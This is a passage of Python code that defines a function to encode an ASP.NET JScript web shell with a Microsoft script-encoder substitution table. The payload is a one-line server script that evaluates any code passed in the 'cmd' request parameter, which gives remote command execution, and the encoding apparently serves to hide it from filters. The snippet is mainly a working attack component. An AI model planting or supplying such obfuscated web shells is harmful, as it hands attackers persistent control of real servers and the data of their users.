...
def encode_payload():
    chr_array = []
    for x in mpbbcrypt:
        chr_array.append(int(hex(x), 16))

    encode_table = bytes.maketrans(bytearray(chr_array[512:]), bytearray(range(256)))
    payload = "<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>".translate(
        encode_table)
